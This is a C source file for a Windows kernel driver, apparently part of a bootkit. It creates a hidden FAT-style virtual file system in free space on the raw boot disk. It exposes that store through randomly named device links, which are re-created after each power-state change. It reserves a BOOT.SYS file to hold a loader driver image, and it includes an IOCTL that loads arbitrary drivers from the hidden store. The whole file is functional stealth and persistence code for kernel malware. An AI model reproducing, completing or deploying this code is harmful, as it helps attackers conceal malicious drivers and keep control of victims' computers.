//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// FsLib project
//	
// module: fslib.c
// $Revision: 80 $
// $Date: 2012-07-11 18:01:22 +0400 (Ср, 11 июл 2012) $
// description:
//  Virtual file system control driver.
//	Dispatches client requests (IRPs), transferes them to the virtual FAT driver (VFAT).

#include <ntddk.h>

#include "version.h"
#include "ntddkex.h"
#include "kdbg.h"
#include "bklib.h"
#include "..\bkdrv\bkdrv.h"
#include "..\bklib\fssup.h"
#include "fslib.h"
#include "vfat.h"

#ifdef	_BK_DRVLDR
	#include "..\drvldr\drvldr.h"
#endif
#ifdef	_BK_FILTER
	#include "..\bkfilter\bkfilter.h"
#endif


#define		wczDosDevice	L"\\??\\"
#define		wczBootDevice	L"\\Device\\Harddisk0\\DR0"
#define		szBootSys		"\\BOOT.SYS"

#define		FS_DEVICE_NAME_SEED		0


PDEVICE_OBJECT		g_FsDeviceObject = NULL;
PVOID				g_FsPowerCallbackRegistration = NULL;

PUNICODE_STRING		g_FsDeviceName = NULL;
PUNICODE_STRING		g_FsLinkName = NULL;

UNICODE_STRING		g_FsVolumeDevice = RTL_CONSTANT_STRING(wczBootDevice);

PBK_DRIVER_DISPATCH_TABLE	g_FsDispatchTable = NULL;


// --- Miscellaneous routines ----------------------------------------------------------------------------------------------


//
//	Searches for free disk space to allocate FS area there.
//
NTSTATUS FsLibGetFsArea(
	IN OUT	PBK_FS_AREA	pFsArea
	)
{
	PVOID		WorkBuffer = NULL;
	NTSTATUS	ntStatus;
	OBJECT_ATTRIBUTES	oa;
	IO_STATUS_BLOCK		IoStatus;

	pFsArea->pDeviceName = &g_FsVolumeDevice;
	InitializeObjectAttributes(&oa, pFsArea->pDeviceName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	
	ntStatus = ZwOpenFile(&pFsArea->hDevice, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, &oa, &IoStatus, 
		FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);

	if (NT_SUCCESS(ntStatus))
	{
		if (WorkBuffer = MyAllocatePool(PagedPool, PAGE_SIZE))
		{
			// Searching for FS area.
			ntStatus = BkAllocateFsArea(pFsArea, WorkBuffer);
			MyFreePool(WorkBuffer);
		}	// if (WorkBuffer = MyAllocatePool(PagedPool, PAGE_SIZE)) 
		else
			ntStatus = STATUS_INSUFFICIENT_RESOURCES;

		ZwClose(pFsArea->hDevice);
	}	// if (NT_SUCCESS(ntStatus))

	if (!NT_SUCCESS(ntStatus))
	{
		KdPrint(("VFS: Unable to allocate FS area, status 0x%x\n", ntStatus));
	}

	return(ntStatus);
}


//
//	Queries and user-suplyed buffer from the IRP.
//	Performs read\write check if needed.
//
static NTSTATUS	ProbeAndGetIrpUserBuffer(PIRP Irp, PVOID* pUserBuffer, ULONG Length, BOOL bWrite)
{
	NTSTATUS	ntStatus = STATUS_SUCCESS;
	PVOID	UserBuffer;

	if (!Irp->MdlAddress)
	{
        UserBuffer = Irp->UserBuffer;
		if (Irp->RequestorMode != KernelMode)
		{
			__try 
			{
				if (bWrite)
					ProbeForWrite(UserBuffer, Length, sizeof(UCHAR));
				else
					ProbeForRead(UserBuffer, Length, sizeof(UCHAR));				
			} 
			__except(EXCEPTION_EXECUTE_HANDLER)
			{
				ntStatus = GetExceptionCode();
			}	
		}	// if (Irp->RequestorMode != KernelMode)
		*pUserBuffer = UserBuffer;
	}	// if (!Irp->MdlAddress)
	else
		UserBuffer = MmGetSystemAddressForMdlSafe(Irp->MdlAddress, NormalPagePriority);

	return(ntStatus);
}



//
//	Creates BOOT.SYS file, and Allocates FAT sectors for it.
//	This file will contain BK-loader driver image.
//
NTSTATUS	FsAllocateBoot(VOID)
{
	NTSTATUS	ntStatus;
	PVFAT_FILE_CONTEXT	Ctx;
	ANSI_STRING	aBootSys = RTL_CONSTANT_STRING(szBootSys);
	LARGE_INTEGER		FilePosition = {0};


	// Trying to create BOOT.SYS file
	ntStatus = VfatCreateFile(&Ctx, &aBootSys, FILE_GENERIC_READ | FILE_GENERIC_WRITE, 0, FILE_CREATE << 24, 0, &FilePosition);
	if (NT_SUCCESS(ntStatus))
	{
		// The file was successfully created, appending it's size.
		FilePosition.QuadPart = BK_FS_BOOT_FILE_SIZE;
		ntStatus = VfatSetFileInfo(Ctx, (PCHAR)&FilePosition, sizeof(LARGE_INTEGER), FileEndOfFileInformation);
		VfatCloseHandle(Ctx);
	}
	return(ntStatus);
}


#ifdef _BK_DRVLDR

//
//	Loads the specified NT driver using DrvLdr library.
//
NTSTATUS FsLoadDriver(
	PWCHAR	PathBuffer,		// Buffer with path to the driver image in WCHARs
	ULONG	BufferLength	// Length of the buffer in bytes
	)
{
	PWCHAR		ImagePath;
	ULONG		PathOffset = 0, PathLen = _ALIGN(BufferLength, sizeof(WCHAR));
	NTSTATUS	ntStatus = STATUS_INSUFFICIENT_RESOURCES;
	UNICODE_STRING	uImagePath;

	if (PathLen > BufferLength)
		PathLen -= sizeof(WCHAR);

	if (ImagePath = MyAllocatePool(PagedPool, cstrlenW(wczDosDevice) * sizeof(WCHAR) + PathLen + sizeof(WCHAR)))
	{
		memcpy(ImagePath, wczDosDevice, cstrlenW(wczDosDevice) * sizeof(WCHAR));

		//	Checking for '\\.\'-style path, that means this is a VFS-relative path
		if ((PathLen > (4 * sizeof(WCHAR))) && PathBuffer[2] == '.' && PathBuffer[1] == '\\')
			// Skipping '\\.\' prefix
			PathOffset = 4;

		memcpy(ImagePath + cstrlenW(wczDosDevice), PathBuffer + PathOffset, PathLen - (PathOffset * sizeof(WCHAR)));
		ImagePath[PathLen / sizeof(WCHAR) + cstrlenW(wczDosDevice)] = 0;

		RtlInitUnicodeString(&uImagePath, ImagePath);

		KdPrint(("VFS: Loading driver: %S\n", uImagePath.Buffer));
		ntStatus = DrvLdrLoadDriver(&uImagePath);
		KdPrint(("VFS: Loading complete with status 0x%x\n", ntStatus));

		MyFreePool(ImagePath);
	}

	return(ntStatus);
}

#endif


// ---- Internal APIs ------------------------------------------------------------------------------------------------------

NTSTATUS	FsLoadFile(PANSI_STRING	aFileName, PCHAR* pBuffer, PULONG pSize)
{
	NTSTATUS		ntStatus;
	LARGE_INTEGER	FilePosition = {0};
	PVFAT_FILE_CONTEXT	Ctx;
	
	// Trying to open the specified file
	ntStatus = VfatCreateFile(&Ctx, aFileName, FILE_GENERIC_READ, 0, FILE_OPEN << 24, 0, &FilePosition);
	if (NT_SUCCESS(ntStatus))
	{
		FILE_STANDARD_INFORMATION	StdInfo;
		ULONG_PTR	bRet;

		// The file was successfully opened, requesting it's size
		ntStatus = VfatQueryFileInfo(Ctx, &StdInfo, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation, &bRet);
		if (NT_SUCCESS(ntStatus))
		{
			if (StdInfo.EndOfFile.LowPart > 0)
			{
				// Allocating a buffer for the file data.
				// Adding one extra byte to the file size for a NULL-char to simplify text processig.
				if (*pBuffer = MyAllocatePool(PagedPool, StdInfo.EndOfFile.LowPart + 1))
				{
					ntStatus = VfatReadWriteFile(Ctx, *pBuffer, StdInfo.EndOfFile.LowPart, &FilePosition, &bRet, FALSE);
					if (NT_SUCCESS(ntStatus))
					{
						// Adding NULL-char after the end of the file
						(*pBuffer)[bRet] = 0;
						*pSize = (ULONG)bRet;
					}
					else
						MyFreePool(*pBuffer);
				}
				else
					ntStatus = STATUS_INSUFFICIENT_RESOURCES;
			}	// if (StdInfo.EndOfFile.LowPart >= sizeof(KBOT_CONFIG))
			else
				ntStatus = STATUS_MAPPED_FILE_SIZE_ZERO;
		}	// if (NT_SUCCESS(ntStatus))

		VfatCloseHandle(Ctx);
	}
	return(ntStatus);
}


NTSTATUS	FsSaveFile(PANSI_STRING	aFileName, PCHAR Buffer, ULONG Size)
{
	NTSTATUS		ntStatus;
	LARGE_INTEGER	FilePosition = {0};
	PVFAT_FILE_CONTEXT	Ctx;
	
	// Trying to open the specified file
	ntStatus = VfatCreateFile(&Ctx, aFileName, FILE_GENERIC_READ | FILE_GENERIC_WRITE, 0, FILE_OPEN_IF << 24, 0, &FilePosition);
	if (NT_SUCCESS(ntStatus))
	{
		FILE_STANDARD_INFORMATION	StdInfo;
		ULONG_PTR	bRet;

		// The file was successfully opened
		ntStatus = VfatReadWriteFile(Ctx, Buffer, Size, &FilePosition, &bRet, TRUE);
		if (NT_SUCCESS(ntStatus))
		{
			// Setting file position (truncating it if needed)
			FilePosition.LowPart = (ULONG)bRet;
			ntStatus = VfatSetFileInfo(Ctx, (PCHAR)&FilePosition, sizeof(LARGE_INTEGER), FileEndOfFileInformation);
		}
		VfatCloseHandle(Ctx);
	}
	return(ntStatus);
}

NTSTATUS	FsDeleteFile(PANSI_STRING aFileName)
{
	NTSTATUS		ntStatus;
	LARGE_INTEGER	FilePosition = {0};
	PVFAT_FILE_CONTEXT	Ctx;
	
	// Trying to open the specified file
	ntStatus = VfatCreateFile(&Ctx, aFileName, DELETE, 0, FILE_OPEN << 24, 0, &FilePosition);
	if (NT_SUCCESS(ntStatus))
	{
		// Marking the file as deleted
		FILE_DISPOSITION_INFORMATION DisposeInfo = {TRUE};
		ntStatus = VfatSetFileInfo(Ctx, (PCHAR)&DisposeInfo, sizeof(FILE_DISPOSITION_INFORMATION), FileDispositionInformation);
		VfatCloseHandle(Ctx);
	}
	return(ntStatus);
}


// ---- Dispatch routines --------------------------------------------------------------------------------------------------

NTSTATUS FsDispatchCreate(PIO_STACK_LOCATION IrpStack, PIRP Irp)
{
	NTSTATUS	ntStatus = STATUS_OBJECT_PATH_INVALID;

	if (IrpStack->FileObject->FileName.Length && IrpStack->FileObject->FileName.Buffer)
	{
		ANSI_STRING	AnsiPath = {0};

		// Converting Path to ANSI string
		if (NT_SUCCESS(ntStatus = RtlUnicodeStringToAnsiString(&AnsiPath, &IrpStack->FileObject->FileName, TRUE)))
		{
			ntStatus = VfatCreateFile(
				(PHANDLE)&IrpStack->FileObject->FsContext,
				&AnsiPath,
				IrpStack->Parameters.Create.SecurityContext->DesiredAccess,
				IrpStack->Parameters.Create.ShareAccess,
				IrpStack->Parameters.Create.Options,
				IrpStack->Parameters.Create.FileAttributes,
				&IrpStack->FileObject->CurrentByteOffset
				);

			RtlFreeAnsiString(&AnsiPath);
		
			if (NT_SUCCESS(ntStatus))
				Irp->IoStatus.Information = FILE_OPEN;
		}	// if (NT_SUCCESS(ntStatus = RtlUnicodeStringToAnsiString(&UpperPath, Path, TRUE)))
	}	// if (IrpStack->FileObject->FileName.Length && IrpStack->FileObject->FileName.Buffer)
	
	Irp->IoStatus.Status = ntStatus;	
	return(ntStatus);
}

NTSTATUS FsDispatchClose(PIO_STACK_LOCATION IrpStack, PIRP Irp)
{
	NTSTATUS	ntStatus = STATUS_SUCCESS;
	Irp->IoStatus.Status = VfatCloseHandle(IrpStack->FileObject->FsContext);
	return(ntStatus);
}


NTSTATUS FsDispatchReadWrite(PIO_STACK_LOCATION IrpStack, PIRP Irp, BOOL IsWrite)
{
	NTSTATUS	ntStatus = STATUS_INVALID_USER_BUFFER;
	ULONG		bWritten = 0;
	PCHAR		UserBuffer;

	ntStatus = ProbeAndGetIrpUserBuffer(Irp, &UserBuffer, IrpStack->Parameters.Write.Length, !IsWrite);

	if (NT_SUCCESS(ntStatus))
	{
		ntStatus = VfatReadWriteFile(
							IrpStack->FileObject->FsContext, 
							UserBuffer, 
							IrpStack->Parameters.Write.Length,
							&IrpStack->Parameters.Write.ByteOffset,
							&Irp->IoStatus.Information,
							IsWrite
							);
	}	// if (NT_SUCCESS(ntStatus))

	Irp->IoStatus.Status = ntStatus;
	return(ntStatus);
}


NTSTATUS FsDispatchQueryInfo(PIO_STACK_LOCATION IrpStack, PIRP Irp)
{
	NTSTATUS	ntStatus;
	ULONG		bWritten = 0;
	PCHAR		UserBuffer;

	ntStatus = ProbeAndGetIrpUserBuffer(Irp, &UserBuffer, IrpStack->Parameters.QueryFile.Length, TRUE);

	if (NT_SUCCESS(ntStatus))
	{
		ntStatus = VfatQueryFileInfo(
							IrpStack->FileObject->FsContext, 
							UserBuffer, 
							IrpStack->Parameters.QueryFile.Length,
							IrpStack->Parameters.QueryFile.FileInformationClass,
							&Irp->IoStatus.Information
							);

	}	// 	if (NT_SUCCESS(ntStatus))

	Irp->IoStatus.Status = ntStatus;
	return(ntStatus);
}


NTSTATUS FsDispatchSetInfo(PIO_STACK_LOCATION IrpStack, PIRP Irp)
{
	NTSTATUS	ntStatus = STATUS_INVALID_USER_BUFFER;
	ULONG		bWritten = 0;
	PCHAR		UserBuffer = Irp->AssociatedIrp.SystemBuffer;

	if (UserBuffer)
	{
		ntStatus = VfatSetFileInfo(
							IrpStack->FileObject->FsContext, 
							UserBuffer, 
							IrpStack->Parameters.QueryFile.Length,
							IrpStack->Parameters.QueryFile.FileInformationClass
							);

	}	// if (UserBuffer)

	Irp->IoStatus.Status = ntStatus;
	return(ntStatus);
}


NTSTATUS FsDispatchDirectory(PIO_STACK_LOCATION IrpStack, PIRP Irp)
{
	NTSTATUS ntStatus = STATUS_NOT_IMPLEMENTED;
	PCHAR	UserBuffer;

	if (IrpStack->MinorFunction == IRP_MN_QUERY_DIRECTORY)
	{
		PIO_QUERY_DIRECTORY QueryDir = (PIO_QUERY_DIRECTORY)&IrpStack->Parameters.QueryFile;

		ntStatus = ProbeAndGetIrpUserBuffer(Irp, &UserBuffer, QueryDir->Length, TRUE);

		if (NT_SUCCESS(ntStatus))
		{
			ntStatus = VfatQueryDirectory(
								IrpStack->FileObject->FsContext, 
								UserBuffer,
								QueryDir->Length,
								QueryDir->FileInformationClass,
								QueryDir->FileIndex,
								IrpStack->Flags,
								&Irp->IoStatus.Information
								);
			
		}	// if (NT_SUCCESS(ntStatus))
	}	// if (IrpStack->MinorFunction == IRP_MN_QUERY_DIRECTORY)

	Irp->IoStatus.Status = ntStatus;
	return(ntStatus);
}


NTSTATUS FsDeviceControl(PIO_STACK_LOCATION IrpStack, PIRP Irp)
{
	NTSTATUS	ntStatus = STATUS_NOT_IMPLEMENTED;
	PCHAR		UserBuffer;
	PVOID		FsInfo;
	ULONG		InfoLength;

	
	if (IrpStack->Parameters.DeviceIoControl.IoControlCode == IOCTL_VFS_QUERY_INFO)
	{
		ntStatus = ProbeAndGetIrpUserBuffer(Irp, &UserBuffer, IrpStack->Parameters.DeviceIoControl.OutputBufferLength, TRUE);
		if (NT_SUCCESS(ntStatus))
		{	
			ntStatus = VfatQueryFsInfo(&FsInfo, &InfoLength);
			if (NT_SUCCESS(ntStatus))
			{
				if (IrpStack->Parameters.DeviceIoControl.OutputBufferLength >= InfoLength)
				{
					memcpy(UserBuffer, FsInfo, InfoLength);
				}
				else
					ntStatus = STATUS_BUFFER_TOO_SMALL;

				MyFreePool(FsInfo);
			}	// if (NT_SUCCESS(ntStatus))
		}	// if (NT_SUCCESS(ntStatus))
	}	// if (IrpStack->Parameters.DeviceIoControl.IoControlCode == IOCTL_VFS_QUERY_INFO)

#ifdef _BK_DRVLDR
	if (IrpStack->Parameters.DeviceIoControl.IoControlCode == IOCTL_VFS_LOAD_DRIVER)
	{
		ntStatus = FsLoadDriver(Irp->AssociatedIrp.SystemBuffer, IrpStack->Parameters.DeviceIoControl.InputBufferLength);
	}	// if (IrpStack->Parameters.DeviceIoControl.IoControlCode == IOCTL_VFS_QUERY_INFO)
#endif

	return(ntStatus);
}



//
//	Callback function.
//	Called every time the system power state changed. 
//	When the system power is on (returning from sleep or hibernate states), creates new symbolic link for the VFS device.
//
VOID FsDevicePower(
	IN PVOID CallbackContext,
    IN PVOID Argument1,
    IN PVOID Argument2
    )
{
	if ((ULONG_PTR)Argument1 == PO_CB_SYSTEM_STATE_LOCK && (ULONG_PTR)Argument2 == 1)
	{
		IoDeleteSymbolicLink(g_FsLinkName);
		BkFreeUnicodeString(g_FsLinkName);

		BkCreateRandomNamedLink(g_FsDeviceName, FS_DEVICE_NAME_SEED, &g_FsLinkName);
	}	// if ((ULONG_PTR)Argument1 == PO_CB_SYSTEM_STATE_LOCK && (ULONG_PTR)Argument2 == 1)

}


NTSTATUS FsCommonDispatchRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	BOOL	IsWrite = FALSE;
	NTSTATUS	ntStatus = STATUS_SUCCESS;
	PIO_STACK_LOCATION	IrpStack = IoGetCurrentIrpStackLocation(Irp);

	if (DeviceObject == g_FsDeviceObject)
	{
		switch (IrpStack->MajorFunction)
		{
		case IRP_MJ_CREATE:
			ntStatus = FsDispatchCreate(IrpStack, Irp);
			break;
		case IRP_MJ_CLOSE:
			ntStatus = FsDispatchClose(IrpStack, Irp);
			break;
		case IRP_MJ_WRITE:
			IsWrite = TRUE;
		case IRP_MJ_READ:
			ntStatus = FsDispatchReadWrite(IrpStack, Irp, IsWrite);
			break;
		case IRP_MJ_QUERY_INFORMATION:
			ntStatus = FsDispatchQueryInfo(IrpStack, Irp);
			break;
		case IRP_MJ_SET_INFORMATION:
			ntStatus = FsDispatchSetInfo(IrpStack, Irp);
			break;
		case IRP_MJ_DIRECTORY_CONTROL:
			ntStatus = FsDispatchDirectory(IrpStack, Irp);
			break;
		case IRP_MJ_DEVICE_CONTROL:
			ntStatus = FsDeviceControl(IrpStack, Irp);
		default:
			break;
		}	// switch (IrpStack->MajorFunction)

		IoCompleteRequest(Irp, IO_NO_INCREMENT);
	}
	else	// if (DeviceObject == g_FsDeviceObject)
		ntStatus = STATUS_NO_SUCH_DEVICE;
	
	return(ntStatus);
}





// ---- Startup/cleanup ----------------------------------------------------------------------------------------------------

NTSTATUS	RegisterPowerStateChangeCallback(VOID)
{
    NTSTATUS	ntStatus;
	OBJECT_ATTRIBUTES	Oa;
    UNICODE_STRING		uPowerStateCallback = RTL_CONSTANT_STRING(L"\\Callback\\PowerState");
	PCALLBACK_OBJECT	pCallback;

    InitializeObjectAttributes(&Oa, &uPowerStateCallback, OBJ_CASE_INSENSITIVE, NULL, NULL);

    ntStatus = ExCreateCallback(&pCallback, &Oa, FALSE, TRUE);

    if (NT_SUCCESS(ntStatus)) 
	{
		g_FsPowerCallbackRegistration = ExRegisterCallback(pCallback, &FsDevicePower, NULL);
		ObDereferenceObject(pCallback);
		
        if (g_FsPowerCallbackRegistration == NULL)
			ntStatus = STATUS_NO_CALLBACK_ACTIVE;
    }

    return ntStatus;
}



VOID FsLibCleanup(IN PDRIVER_OBJECT  DriverObject)
{
	if (g_FsPowerCallbackRegistration) 
	{
        ExUnregisterCallback(g_FsPowerCallbackRegistration);
        g_FsPowerCallbackRegistration = NULL;
    }

	if (g_FsLinkName)
	{
		IoDeleteSymbolicLink(g_FsLinkName);
		BkFreeUnicodeString(g_FsLinkName);
	}

	if (g_FsDeviceObject)
		IoDeleteDevice(g_FsDeviceObject);

	if (g_FsDeviceName)
		BkFreeUnicodeString(g_FsDeviceName);

	VfatCleanup();

	UNREFERENCED_PARAMETER(DriverObject);
}


NTSTATUS	FsLibStartup(
	IN		PDRIVER_OBJECT  DriverObject,
	IN		PUNICODE_STRING RegistryPath
	)
{
	NTSTATUS	ntStatus = STATUS_INSUFFICIENT_RESOURCES;
	PWCHAR		FsDeviceName = NULL;

	if (g_FsDispatchTable = BkAllocateDriverDispatchTable())
	{
		g_FsDispatchTable->MajorFunction[IRP_MJ_CREATE]	= &FsCommonDispatchRoutine;
		g_FsDispatchTable->MajorFunction[IRP_MJ_CLOSE]	= &FsCommonDispatchRoutine;
		g_FsDispatchTable->MajorFunction[IRP_MJ_READ]	= &FsCommonDispatchRoutine;
		g_FsDispatchTable->MajorFunction[IRP_MJ_WRITE]	= &FsCommonDispatchRoutine;
		g_FsDispatchTable->MajorFunction[IRP_MJ_DIRECTORY_CONTROL] = &FsCommonDispatchRoutine;
		g_FsDispatchTable->MajorFunction[IRP_MJ_QUERY_INFORMATION] = &FsCommonDispatchRoutine;
		g_FsDispatchTable->MajorFunction[IRP_MJ_SET_INFORMATION] = &FsCommonDispatchRoutine;
		g_FsDispatchTable->MajorFunction[IRP_MJ_DEVICE_CONTROL] = &FsCommonDispatchRoutine;

		BkRegisterDriverDispatchTable(g_FsDispatchTable);

		ntStatus = BkCreateRandomNamedDevice(DriverObject, FS_DEVICE_NAME_SEED, FILE_DEVICE_DISK_FILE_SYSTEM, 
			&g_FsDeviceName, &g_FsDeviceObject);
		if (NT_SUCCESS(ntStatus))
			ntStatus = RegisterPowerStateChangeCallback();
	}

	if (!NT_SUCCESS(ntStatus))
	{		// An error occured, performing a cleanup
		FsLibCleanup(DriverObject);
	}
	
	return(ntStatus);
}

//
//	Initializes and activates VFS.
//
NTSTATUS FsLibActivate(
	IN	PBK_FS_AREA pFsArea
	)
{
	NTSTATUS ntStatus;

	ntStatus = VfatInitialize(pFsArea);
	if (NT_SUCCESS(ntStatus))
	{
		ntStatus = BkCreateRandomNamedLink(g_FsDeviceName, FS_DEVICE_NAME_SEED, &g_FsLinkName);
		if (NT_SUCCESS(ntStatus))
			FsAllocateBoot();
	}

	return(ntStatus);
}
